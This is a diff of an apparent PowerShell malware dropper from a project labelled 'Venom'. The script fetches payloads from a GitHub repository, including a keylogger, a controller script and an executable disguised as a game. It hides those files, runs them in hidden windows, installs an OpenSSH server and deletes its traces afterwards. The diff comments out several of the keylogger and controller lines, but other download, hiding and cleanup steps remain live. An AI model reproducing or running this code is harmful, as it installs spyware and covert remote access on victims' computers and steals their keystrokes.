@@ -70,10 +70,10 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/Proj
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs" -OutFile "FoRAUwtxKkSB.vbs"
 Invoke-WebRequest -OutFile "config.json" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/config.json"
 Invoke-WebRequest -OutFile "ZDaFvwjOosKx.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/keylogger.ps1" -OutFile "KVbOiPPcus.ps1"
-Invoke-WebRequest -OutFile "vaoYIkVglzTJ.cmd" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/controller.cmd"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/fly.ps1" -OutFile "ZYHGCKXWlonm.ps1"
-Invoke-WebRequest -OutFile "AssassinsCreed_SE.exe" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/AssassinsCreed_SE.exe"
+#Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/keylogger.ps1" -OutFile "KVbOiPPcus.ps1"
+#Invoke-WebRequest -OutFile "vaoYIkVglzTJ.cmd" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/controller.cmd"
+#Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/fly.ps1" -OutFile "ZYHGCKXWlonm.ps1"
+#Invoke-WebRequest -OutFile "AssassinsCreed_SE.exe" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/AssassinsCreed_SE.exe"
 
 
 # Install and Configure OpenSSH Server
@@ -91,10 +91,10 @@ Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir
 
 Start-Sleep -Seconds 30
 
-Set-ItemProperty -Name Attributes -Path "$path\vaoYIkVglzTJ.cmd" -Value "Hidden"
-Set-ItemProperty -Name Attributes -Path "$path\KVbOiPPcus.ps1" -Value "Hidden"
+# Set-ItemProperty -Name Attributes -Path "$path\vaoYIkVglzTJ.cmd" -Value "Hidden"
+# Set-ItemProperty -Name Attributes -Path "$path\KVbOiPPcus.ps1" -Value "Hidden"
 
-Start-Process -ArgumentList "vaoYIkVglzTJ.cmd" -windowstyle hidden -FilePath "cscript.exe"
+# Start-Process -ArgumentList "vaoYIkVglzTJ.cmd" -windowstyle hidden -FilePath "cscript.exe"
 
 # Create New Directory and Change to It
 New-Item -ItemType Directory -Path "$path" -Name "$wd"
@@ -139,9 +139,9 @@ Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
 Set-ItemProperty -Name Attributes -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Value "Hidden"
 
-Set-ItemProperty -Name Attributes -Path "$path\ZYHGCKXWlonm.ps1" -Value "Hidden"
+# Set-ItemProperty -Name Attributes -Path "$path\ZYHGCKXWlonm.ps1" -Value "Hidden"
 
-Start-Process -FilePath "$path\ZYHGCKXWlonm.ps1" -windowstyle hidden
+# Start-Process -FilePath "$path\ZYHGCKXWlonm.ps1" -windowstyle hidden
 
 cd $initial_dir
 
@@ -163,6 +163,6 @@ Start-Sleep -Seconds 200
 Remove-Item -Path "$initial_dir\ip.txt"
 Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
 Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
-Remove-Item -Path "$path\vaoYIkVglzTJ.cmd"
+# Remove-Item -Path "$path\vaoYIkVglzTJ.cmd"
 Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
 Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
